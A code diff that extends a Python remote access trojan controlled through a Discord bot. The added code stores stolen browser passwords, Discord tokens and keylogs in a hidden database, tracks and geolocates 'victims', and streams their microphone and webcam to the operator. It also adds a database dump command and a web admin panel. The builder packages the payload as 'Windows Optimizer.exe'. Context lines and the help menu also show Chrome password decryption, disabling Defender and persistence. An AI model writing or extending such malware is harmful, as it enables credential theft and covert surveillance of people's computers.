@@ -40,10 +40,11 @@ import pyaudio
 import wave
 import glob
 import webbrowser
+import time
 
 
 
-TOKEN = "YOUR-OWN-TOKEN"
+TOKEN = "YOUR-BOT-TOKEN"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -51,6 +52,169 @@ intents.guilds = True
 intents.messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+
+# --- Database Setup ---
+DB_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'sysdata.db')
+
+def init_database():
+    """Initialize SQLite database for storing stolen data and analytics"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    # Table for stolen credentials
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS credentials (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            browser TEXT,
+            url TEXT,
+            username TEXT,
+            password TEXT,
+            victim_id TEXT
+        )
+    ''')
+
+    # Table for victim analytics
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS victims (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            victim_id TEXT UNIQUE,
+            first_seen TEXT,
+            last_seen TEXT,
+            hostname TEXT,
+            username TEXT,
+            os_version TEXT,
+            ip_address TEXT,
+            country TEXT,
+            city TEXT,
+            total_commands INTEGER DEFAULT 0
+        )
+    ''')
+
+    # Table for command logs
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS command_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            victim_id TEXT,
+            command TEXT,
+            success INTEGER
+        )
+    ''')
+
+    # Table for keylog data
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS keylogs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            victim_id TEXT,
+            keystrokes TEXT
+        )
+    ''')
+
+    # Table for Discord tokens
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS discord_tokens (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            victim_id TEXT,
+            token TEXT UNIQUE
+        )
+    ''')
+
+    conn.commit()
+    conn.close()
+
+def get_victim_id():
+    """Generate unique victim ID based on hardware"""
+    try:
+        hostname = platform.node()
+        username = getpass.getuser()
+        return f"{hostname}_{username}_{platform.machine()}"
+    except:
+        return "UNKNOWN"
+
+def log_command(command, success=True):
+    """Log executed command to database"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO command_logs (timestamp, victim_id, command, success)
+            VALUES (?, ?, ?, ?)
+        ''', (datetime.datetime.now().isoformat(), get_victim_id(), command, 1 if success else 0))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+def update_victim_info():
+    """Update or create victim record"""
+    try:
+        victim_id = get_victim_id()
+        uname = platform.uname()
+        ip = get_public_ip()
+
+        # Get location data
+        location_data = {}
+        if ip:
+            try:
+                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
+                if response.get('status') == 'success':
+                    location_data = response
+            except:
+                pass
+
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+
+        # Check if victim exists
+        cursor.execute('SELECT id, total_commands FROM victims WHERE victim_id = ?', (victim_id,))
+        result = cursor.fetchone()
+
+        if result:
+            # Update existing victim
+            cursor.execute('''
+                UPDATE victims
+                SET last_seen = ?, ip_address = ?, country = ?, city = ?, total_commands = ?
+                WHERE victim_id = ?
+            ''', (
+                datetime.datetime.now().isoformat(),
+                ip or 'Unknown',
+                location_data.get('country', 'Unknown'),
+                location_data.get('city', 'Unknown'),
+                result[1] + 1,
+                victim_id
+            ))
+        else:
+            # Create new victim record
+            cursor.execute('''
+                INSERT INTO victims (victim_id, first_seen, last_seen, hostname, username, os_version, ip_address, country, city, total_commands)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                victim_id,
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat(),
+                uname.node,
+                getpass.getuser(),
+                f"{uname.system} {uname.release}",
+                ip or 'Unknown',
+                location_data.get('country', 'Unknown'),
+                location_data.get('city', 'Unknown'),
+                1
+            ))
+
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+# Initialize database on startup
+try:
+    init_database()
+    update_victim_info()
+except:
+    pass
 
 # --- Screen recording state ---
 screen_recording = {
@@ -71,6 +235,102 @@ keylogger_state = {
 @bot.event
 async def on_ready():
     print(f"Bot connected as {bot.user}")
+    update_victim_info()
+
+@bot.command(name="analytics")
+async def show_analytics(ctx):
+    """📊 Show victim analytics from database"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+
+        # Get victim info
+        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (get_victim_id(),))
+        victim = cursor.fetchone()
+
+        if not victim:
+            await ctx.send("❌ No analytics data found")
+            return
+
+        # Get command count
+        cursor.execute('SELECT COUNT(*) FROM command_logs WHERE victim_id = ?', (get_victim_id(),))
+        cmd_count = cursor.fetchone()[0]
+
+        # Get credential count
+        cursor.execute('SELECT COUNT(*) FROM credentials WHERE victim_id = ?', (get_victim_id(),))
+        cred_count = cursor.fetchone()[0]
+
+        # Get token count
+        cursor.execute('SELECT COUNT(*) FROM discord_tokens WHERE victim_id = ?', (get_victim_id(),))
+        token_count = cursor.fetchone()[0]
+
+        embed = discord.Embed(
+            title="📊 Victim Analytics",
+            color=0xff6b6b,
+            description=f"**Victim ID:** `{victim[1]}`"
+        )
+
+        embed.add_field(name="🖥️ System Info", value=f"**Hostname:** {victim[4]}\n**Username:** {victim[5]}\n**OS:** {victim[6]}", inline=False)
+        embed.add_field(name="🌍 Location", value=f"**IP:** {victim[7]}\n**Country:** {victim[8]}\n**City:** {victim[9]}", inline=False)
+        embed.add_field(name="📅 Activity", value=f"**First Seen:** {victim[2]}\n**Last Seen:** {victim[3]}\n**Total Commands:** {victim[10]}", inline=False)
+        embed.add_field(name="💰 Stolen Data", value=f"**Credentials:** {cred_count}\n**Discord Tokens:** {token_count}", inline=False)
+
+        conn.close()
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(f"❌ Analytics error: {str(e)}")
+
+@bot.command(name="dumpdb")
+async def dump_database(ctx):
+    """💾 Download the entire database file"""
+    try:
+        if os.path.exists(DB_PATH):
+            await ctx.send("📦 **Sending database file...**", file=discord.File(DB_PATH, "victim_data.db"))
+            log_command("dumpdb", True)
+        else:
+            await ctx.send("❌ Database file not found")
+    except Exception as e:
+        await ctx.send(f"❌ Database dump failed: {str(e)}")
+
+@bot.command(name="viewcreds")
+async def view_stored_creds(ctx, limit: int = 20):
+    """🔑 View stored credentials from database"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT timestamp, browser, url, username, password
+            FROM credentials
+            WHERE victim_id = ?
+            ORDER BY timestamp DESC
+            LIMIT ?
+        ''', (get_victim_id(), limit))
+
+        results = cursor.fetchall()
+        conn.close()
+
+        if not results:
+            await ctx.send("❌ No stored credentials found")
+            return
+
+        output = f"**🔑 Stored Credentials (Last {len(results)}):**\n\n"
+        for row in results:
+            output += f"**[{row[0]}]** {row[1]}\n"
+            output += f"URL: {row[2]}\n"
+            output += f"User: {row[3]}\n"
+            output += f"Pass: {row[4]}\n\n"
+
+        # Split if too long
+        if len(output) > 1900:
+            chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
+            for chunk in chunks:
+                await ctx.send(chunk)
+        else:
+            await ctx.send(output)
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
 
 # ---------------- Core Commands ----------------------
 
@@ -389,34 +649,34 @@ async def dump_discord_info(ctx):
 async def record_microphone(ctx, duration: int = 30):
     """🎤 Records microphone audio for specified duration."""
     try:
-        
-    
+
+
  # Audio configuration
         CHUNK = 1024
         FORMAT = pyaudio.paInt16
         CHANNELS = 1
         RATE = 44100
         RECORD_SECONDS = duration
-        
+
         p = pyaudio.PyAudio()
-        
+
         stream = p.open(format=FORMAT,
                         channels=CHANNELS,
                         rate=RATE,
                         input=True,
                         frames_per_buffer=CHUNK)
-        
+
         await ctx.send(f"Recording microphone for {duration} seconds...")
-        
+
         frames = []
         for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
             data = stream.read(CHUNK)
             frames.append(data)
-        
+
         stream.stop_stream()
         stream.close()
         p.terminate()
-        
+
         # Save recording
         wf = wave.open("mic_recording.wav", 'wb')
         wf.setnchannels(CHANNELS)
@@ -424,39 +684,182 @@ async def record_microphone(ctx, duration: int = 30):
         wf.setframerate(RATE)
         wf.writeframes(b''.join(frames))
         wf.close()
-        
+
         await ctx.send(file=discord.File("mic_recording.wav"))
         os.remove("mic_recording.wav")
-        
+        log_command("micrecord", True)
+
     except Exception as e:
         await ctx.send(f"Microphone recording failed: {e}\nInstall pyaudio first: `pip install pyaudio`")
+        log_command("micrecord", False)
+
+# --- Live Voice Monitoring State ---
+live_audio_state = {
+    "is_streaming": False,
+    "channel": None,
+    "task": None,
+    "voice_client": None
+}
+
+class MicrophoneAudioSource(discord.AudioSource):
+    """Custom audio source that streams from microphone"""
+    def __init__(self):
+        self.p = pyaudio.PyAudio()
+        self.stream = self.p.open(
+            format=pyaudio.paInt16,
+            channels=2,
+            rate=48000,  # Discord uses 48kHz
+            input=True,
+            frames_per_buffer=960  # 20ms at 48kHz
+        )
+
+    def read(self):
+        """Read audio data from microphone"""
+        try:
+            data = self.stream.read(960, exception_on_overflow=False)
+            return data
+        except:
+            return b'\x00' * 1920  # Return silence on error
+
+    def cleanup(self):
+        """Clean up audio resources"""
+        try:
+            self.stream.stop_stream()
+            self.stream.close()
+            self.p.terminate()
+        except:
+            pass
+
+@bot.command(name="startlive")
+async def start_live_audio(ctx):
+    """🎙️ Start live microphone streaming to Discord voice channel"""
+    try:
+        if live_audio_state["is_streaming"]:
+            await ctx.send("⚠️ Live audio is already streaming!")
+            return
+
+        # Check if user is in a voice channel
+        if not ctx.author.voice:
+            await ctx.send("❌ You must be in a voice channel first!")
+            return
+
+        channel = ctx.author.voice.channel
+
+        # Connect to voice channel
+        voice_client = await channel.connect()
+
+        # Create audio source
+        audio_source = MicrophoneAudioSource()
+
+        # Start playing (streaming)
+        voice_client.play(audio_source)
+
+        live_audio_state.update({
+            "is_streaming": True,
+            "channel": ctx.channel,
+            "voice_client": voice_client
+        })
+
+        await ctx.send(f"🎙️ **Live microphone streaming started!**\n"
+                      f"📡 Streaming to: {channel.name}\n"
+                      f"⚠️ Use `!stoplive` to stop streaming")
+        log_command("startlive", True)
+
+    except Exception as e:
+        await ctx.send(f"❌ Failed to start live audio: {str(e)}")
+        log_command("startlive", False)
+
+@bot.command(name="stoplive")
+async def stop_live_audio(ctx):
+    """🛑 Stop live microphone streaming"""
+    try:
+        if not live_audio_state["is_streaming"]:
+            await ctx.send("⚠️ No live audio is currently streaming!")
+            return
+
+        # Stop and disconnect
+        if live_audio_state["voice_client"]:
+            live_audio_state["voice_client"].stop()
+            await live_audio_state["voice_client"].disconnect()
+
+        live_audio_state.update({
+            "is_streaming": False,
+            "channel": None,
+            "voice_client": None
+        })
+
+        await ctx.send("🛑 **Live microphone streaming stopped**")
+        log_command("stoplive", True)
+
+    except Exception as e:
+        await ctx.send(f"❌ Failed to stop live audio: {str(e)}")
+        log_command("stoplive", False)
+
+@bot.command(name="livestatus")
+async def live_audio_status(ctx):
+    """📊 Check live audio streaming status"""
+    if live_audio_state["is_streaming"]:
+        await ctx.send(f"✅ **Live audio is currently streaming**\n"
+                      f"Voice Channel: {live_audio_state['voice_client'].channel.name if live_audio_state['voice_client'] else 'Unknown'}")
+    else:
+        await ctx.send("❌ **No live audio streaming active**")
 
 def create_executable():
     """
     Uses PyInstaller to build the current script into a single executable.
-    This is a blocking function meant to be run in an executor.
+    Optimized with UPX compression and various flags to reduce size.
     """
     script_path = os.path.abspath(sys.argv[0])
     exe_name = "Windows Optimizer"
 
     command = [
         'pyinstaller',
-        '--onefile',
-        '--noconsole',
+        '--onefile',                    # Single executable
+        '--noconsole',                  # No console window
         '--name', exe_name,
         '--icon', 'NONE',
+        '--clean',                      # Clean cache
+        '--strip',                      # Strip symbols (reduces size)
+        '--noupx',                      # We'll compress manually if UPX available
+        '--optimize', '2',              # Python optimization level
+        '--exclude-module', 'tkinter',  # Exclude unused modules
+        '--exclude-module', 'matplotlib',
+        '--exclude-module', 'numpy.testing',
+        '--exclude-module', 'PIL.ImageQt',
+        '--log-level', 'ERROR',
         script_path
     ]
-    
+
     try:
+        # Build with PyInstaller
         process = subprocess.run(command, check=True, capture_output=True, text=True)
         final_path = os.path.join('dist', f'{exe_name}.exe')
-        return final_path, None
+
+        # Try to compress with UPX if available
+        try:
+            upx_result = subprocess.run(['upx', '--best', '--lzma', final_path],
+                                       capture_output=True, text=True, timeout=300)
+            if upx_result.returncode == 0:
+                compression_info = f"\n✅ UPX Compression successful!"
+            else:
+                compression_info = f"\n⚠️ UPX compression skipped (not available or failed)"
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            compression_info = f"\n⚠️ UPX not found - install for smaller file size"
+
+        # Get file size
+        if os.path.exists(final_path):
+            size_mb = os.path.getsize(final_path) / (1024 * 1024)
+            size_info = f"\n📦 Final size: {size_mb:.2f} MB"
+        else:
+            size_info = ""
+
+        return final_path, None, compression_info + size_info
+
     except subprocess.CalledProcessError as e:
         error_message = f"Build Failed!\nExit Code: {e.returncode}\n--- STDOUT ---\n{e.stdout}\n--- STDERR ---\n{e.stderr}"
-        return None, error_message
+        return None, error_message, ""
     except FileNotFoundError:
-        return None, "Build Failed: `pyinstaller` command not found. Make sure it's installed (`pip install pyinstaller`) and in your system's PATH."
+        return None, "Build Failed: `pyinstaller` command not found. Make sure it's installed (`pip install pyinstaller`) and in your system's PATH.", ""
 
 @bot.command(name="build")
 @commands.is_owner()
@@ -464,8 +867,8 @@ async def build_command(ctx):
     """🛠️ Compiles the bot into a standalone .exe and sends it."""
     try:
         await ctx.send("`Building executable... This may take a few minutes. Please wait.`")
-        
-        final_path, error = await bot.loop.run_in_executor(None, create_executable)
+
+        final_path, error, info = await bot.loop.run_in_executor(None, create_executable)
 
         if error:
             if len(error) > 1900:
@@ -473,15 +876,15 @@ async def build_command(ctx):
             else:
                 await ctx.send(f"**BUILD FAILED:**\n```{error}```")
             return
-            
+
         if final_path and os.path.exists(final_path):
             await ctx.send(
-                content="**✅ Build Successful!** Here is your payload. Run this on any Windows machine.",
+                content=f"**✅ Build Successful!**{info}\n\nHere is your payload. Run this on any Windows machine.",
                 file=discord.File(final_path)
             )
         else:
             await ctx.send("**❌ Build Failed!** The executable was not found after the build process.")
-            
+
     except Exception as e:
         await ctx.send(f"**An unexpected error occurred during the build process:**\n```{str(e)}```")
     finally:
@@ -641,6 +1044,21 @@ async def webcam(ctx):
         os.remove(filename)
     except Exception as e:
         await ctx.send(f"Webcam error: {e}")
+
+@bot.command(name="webcamstream")
+async def webcam_live_stream(ctx, duration: int = 60):
+    """🎥 Stream live webcam feed"""
+    cap = cv2.VideoCapture(0)
+    start_time = time.time()
+    
+    while (time.time() - start_time) < duration:
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite('webcam_live.jpg', frame)
+            await ctx.send(file=discord.File('webcam_live.jpg'))
+            await asyncio.sleep(2)  # Send frame every 2 seconds
+    
+    cap.release()
 
 # ---------------- Screen Recording -------------------
 
@@ -899,6 +1317,25 @@ def get_chrome_passwords():
     
     return passwords
 
+@bot.command(name="startpanel")
+async def start_admin_panel(ctx, port: int = 5000):
+    """🎯 Start the web-based admin panel"""
+    try:
+        import admin_panel
+        import threading
+
+        # Start Flask server in background thread
+        thread = threading.Thread(target=admin_panel.run_server, args=('0.0.0.0', port), daemon=True)
+        thread.start()
+
+        await ctx.send(f"✅ **Admin Panel Started!**\n"
+                      f"🌐 Access at: http://localhost:{port}\n"
+                      f"📊 Dashboard is now running in the background")
+        log_command("startpanel", True)
+    except Exception as e:
+        await ctx.send(f"❌ Failed to start admin panel: {str(e)}")
+        log_command("startpanel", False)
+
 @bot.command(name="cmds")
 async def show_commands(ctx):
     """📜 Shows all available bot commands"""
@@ -914,8 +1351,8 @@ async def show_commands(ctx):
             "!killdefender - Disables Windows AntiVirus",
             "!disabletaskmgr - Disables Task Manager",
             "!enabletaskmgr - Enables Task Manager",
-            "!openurl [url] - Open a URL in the browser",        
-            "!playsound [url] - Play sound from URL (.wav only)" 
+            "!openurl [url] - Open a URL in the browser",
+            "!playsound [url] - Play sound from URL (.wav only)"
         ],
         "File Operations": [
             "!download [path] - Download a file",
@@ -929,7 +1366,12 @@ async def show_commands(ctx):
             "!keylog - Start keylogger",
             "!stopkl - Stop keylogger",
             "!webcam - Take webcam photo",
-            "!connections - Show network connections"
+            "!connections - Show network connections",
+            "!micrecord [duration] - Record microphone audio",
+            "!startlive - Start live microphone streaming to VC",
+            "!stoplive - Stop live microphone streaming",
+            "!livestatus - Check live audio status"
+            "!webcamstream - Live monitor their webcam"
         ],
         "Persistence": [
             "!persist - Make bot launch on startup",
@@ -938,17 +1380,25 @@ async def show_commands(ctx):
         ],
         "Credential Theft": [
             "!dumpcreds - Dump saved passwords",
-            "!dumpdiscord - Steal Discord tokens"
+            "!dumpdiscord - Steal Discord tokens",
             "!dumpgames - Steal game launcher data"
         ],
-         "Builder": [
+        "Database & Analytics": [
+            "!analytics - Show victim analytics",
+            "!dumpdb - Download database file",
+            "!viewcreds [limit] - View stored credentials"
+        ],
+        "Builder": [
             "!build - Compiles the bot into a distributable .exe "
+        ],
+        "Admin Panel": [
+            "!startpanel [port] - Start web admin dashboard"
         ],
         "Other": [
             "!message [text] - Show message box",
             "!userinfo - Show user info",
             "!cmds - Show this help menu",
-            "!geolocate [port eg. 8.8.8.8] - locates the user"
+            "!geolocate [ip] - Geolocate IP (auto-detects if no IP given)"
         ]
     }
 
@@ -1069,33 +1519,73 @@ async def play_sound_from_url(ctx, *, url: str):
         if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
             os.remove(temp_file_path)
 
-@bot.command(name="geolocate")
-async def geolocate_ip(ctx, ip: str):
-    """🌍 Geolocate an IP address (requires internet)"""
+def get_public_ip():
+    """Gets the victim's public IP address"""
     try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return response.json()['ip']
+    except:
+        try:
+            response = requests.get('https://icanhazip.com', timeout=5)
+            return response.text.strip()
+        except:
+            return None
+
+@bot.command(name="geolocate")
+async def geolocate_ip(ctx, ip: str = None):
+    """🌍 Geolocate an IP address or automatically detect victim's location"""
+    try:
+        # If no IP provided, get the victim's public IP
+        if ip is None:
+            await ctx.send("🔍 Detecting victim's location...")
+            ip = get_public_ip()
+            if not ip:
+                return await ctx.send("❌ Failed to detect public IP address")
+
         # Free IP-API service (100 requests/minute limit)
         response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
-        
+
         if response.get('status') != 'success':
             return await ctx.send(f"❌ Geolocation failed: {response.get('message', 'Unknown error')}")
-        
+
+        # Get more detailed info from ipapi.co
+        try:
+            detailed = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10).json()
+        except:
+            detailed = {}
+
         embed = discord.Embed(
             title=f"📍 IP Geolocation: {ip}",
             color=0x3498db,
-            description=f"**Country:** {response.get('country', 'N/A')}\n"
+            description=f"**Country:** {response.get('country', 'N/A')} ({response.get('countryCode', 'N/A')})\n"
                        f"**Region:** {response.get('regionName', 'N/A')}\n"
                        f"**City:** {response.get('city', 'N/A')}\n"
+                       f"**ZIP Code:** {response.get('zip', detailed.get('postal', 'N/A'))}\n"
+                       f"**Timezone:** {response.get('timezone', 'N/A')}\n"
                        f"**ISP:** {response.get('isp', 'N/A')}\n"
                        f"**Org:** {response.get('org', 'N/A')}\n"
-                       f"**AS:** {response.get('as', 'N/A')}"
+                       f"**AS:** {response.get('as', 'N/A')}\n"
+                       f"**Mobile:** {response.get('mobile', 'N/A')}\n"
+                       f"**Proxy/VPN:** {response.get('proxy', 'N/A')}"
         )
-        
-        # Add map thumbnail if coordinates exist
+
+        # Add coordinates
         if 'lat' in response and 'lon' in response:
-            embed.set_thumbnail(url=f"https://maps.googleapis.com/maps/api/staticmap?center={response['lat']},{response['lon']}&zoom=10&size=400x200&markers=color:red%7C{response['lat']},{response['lon']}")
-        
+            embed.add_field(
+                name="📌 Coordinates",
+                value=f"Lat: {response['lat']}, Lon: {response['lon']}",
+                inline=False
+            )
+            # Google Maps link
+            maps_url = f"https://www.google.com/maps?q={response['lat']},{response['lon']}"
+            embed.add_field(
+                name="🗺️ Google Maps",
+                value=f"[Click here to view on map]({maps_url})",
+                inline=False
+            )
+
         await ctx.send(embed=embed)
-        
+
     except requests.exceptions.Timeout:
         await ctx.send("⌛ Geolocation service timed out")
     except Exception as e:
@@ -1139,22 +1629,31 @@ def steal_browser_creds():
         'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
         'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data')
     }
-    
+
     all_creds = ""
-    
+    victim_id = get_victim_id()
+    timestamp = datetime.datetime.now().isoformat()
+
+    # Connect to our database for storing
+    try:
+        db_conn = sqlite3.connect(DB_PATH)
+        db_cursor = db_conn.cursor()
+    except:
+        db_conn = None
+
     for browser, path in browser_paths.items():
         if not os.path.exists(path):
             continue
-            
+
         master_key = get_master_key(path)
         if not master_key:
             continue
-            
+
         all_creds += f"\n\n--- [ {browser} Credentials ] ---\n"
-        
+
         # Chromium stores profiles in "Default", "Profile 1", "Profile 2", etc.
         profile_folders = [f.path for f in os.scandir(path) if f.is_dir() and (f.name == "Default" or f.name.startswith("Profile "))]
-        
+
         for profile in profile_folders:
             login_db_path = os.path.join(profile, 'Login Data')
             if not os.path.exists(login_db_path):
@@ -1163,24 +1662,42 @@ def steal_browser_creds():
             # Copy DB to avoid lock issues
             temp_db = tempfile.NamedTemporaryFile(delete=False).name
             shutil.copy2(login_db_path, temp_db)
-            
+
             try:
                 conn = sqlite3.connect(temp_db)
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                
+
                 for url, username, encrypted_pass in cursor.fetchall():
                     if url and username and encrypted_pass:
                         decrypted_pass = decrypt_password(encrypted_pass, master_key)
                         if decrypted_pass != "Failed to decrypt":
                             all_creds += f"URL: {url}\nUser: {username}\nPass: {decrypted_pass}\n\n"
-                            
+
+                            # Store in database
+                            if db_conn:
+                                try:
+                                    db_cursor.execute('''
+                                        INSERT INTO credentials (timestamp, browser, url, username, password, victim_id)
+                                        VALUES (?, ?, ?, ?, ?, ?)
+                                    ''', (timestamp, browser, url, username, decrypted_pass, victim_id))
+                                except:
+                                    pass
+
                 conn.close()
             except Exception as e:
                 all_creds += f"Error reading {browser} DB: {e}\n"
             finally:
                 os.remove(temp_db)
-                
+
+    # Commit database changes
+    if db_conn:
+        try:
+            db_conn.commit()
+            db_conn.close()
+        except:
+            pass
+
     return all_creds if all_creds else "No credentials found."
 
 bot.run(TOKEN)
